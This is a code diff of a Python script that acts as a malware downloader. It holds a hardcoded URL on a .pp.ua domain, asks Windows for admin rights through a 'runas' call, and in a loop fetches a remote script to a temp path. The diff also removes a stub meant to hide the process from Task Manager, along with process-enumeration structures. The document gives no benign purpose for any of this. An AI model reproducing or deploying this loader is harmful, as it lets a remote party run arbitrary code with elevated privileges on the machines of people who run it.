@@ -4,29 +4,12 @@ import time
 import ctypes
 import sys
 
-# URL of the server hosting the Python script
+
 SERVER_URL = 'https://nikestylesite.pp.ua/files/app.py/'
 # Path where the script will be temporarily saved
-TEMP_SCRIPT_PATH = 'temp_script.py'
+TEMP_SCRIPT_PATH = 'tmp/temp_script.py'
 # File path to the current script being executed
 CURRENT_SCRIPT_PATH = os.path.abspath(__file__)
-
-# Windows API Definitions
-PROCESS_QUERY_INFORMATION = 0x0400
-PROCESS_VM_READ = 0x0010
-TH32CS_SNAPPROCESS = 0x00000002
-
-class PROCESSENTRY32(ctypes.Structure):
-    _fields_ = [("dwSize", ctypes.c_ulong),
-                ("cntUsage", ctypes.c_ulong),
-                ("th32ProcessID", ctypes.c_ulong),
-                ("th32DefaultHeapID", ctypes.c_void_p),
-                ("dcModule", ctypes.c_ulong),
-                ("cntThreads", ctypes.c_ulong),
-                ("th32ParentProcessID", ctypes.c_ulong),
-                ("pcPriClassBase", ctypes.c_long),
-                ("dwFlags", ctypes.c_ulong),
-                ("szExeFile", ctypes.c_char * 260)]
 
 def is_admin():
     try:
@@ -36,10 +19,6 @@ def is_admin():
 
 def run_as_admin(script_path):
     ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, script_path, None, 1)
-
-def hide_process():
-    # Attempt to hide the process from Task Manager
-    pass  # Full implementation would require more complex operations
 
 def download_script(url, path):
     try:
@@ -65,8 +44,6 @@ def main():
         run_as_admin(script_path)
         sys.exit()
 
-    hide_process()
-
     while True:
         if is_server_reachable(SERVER_URL):
             download_script(SERVER_URL, TEMP_SCRIPT_PATH)
@@ -81,4 +58,3 @@ if os.name == 'nt':
 
 if __name__ == "__main__":
     main()
-    
